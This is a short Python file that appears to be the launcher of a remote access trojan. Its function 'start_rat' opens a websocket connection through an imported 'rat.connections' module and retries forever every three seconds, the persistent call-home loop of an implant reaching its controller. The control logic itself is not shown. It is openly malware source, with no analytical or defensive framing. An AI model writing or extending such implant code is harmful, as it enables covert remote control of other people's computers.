from rat.connections import socket
import time

async def start_rat():
    try:
       await socket.websocket_client()
    except Exception as e:
        print(f"Connection failed ({e}), retrying...")
        while True:
            try:
               await socket.websocket_client()
               break
            except:
                print("Connection failed, retrying in 3...")
                time.sleep(3)
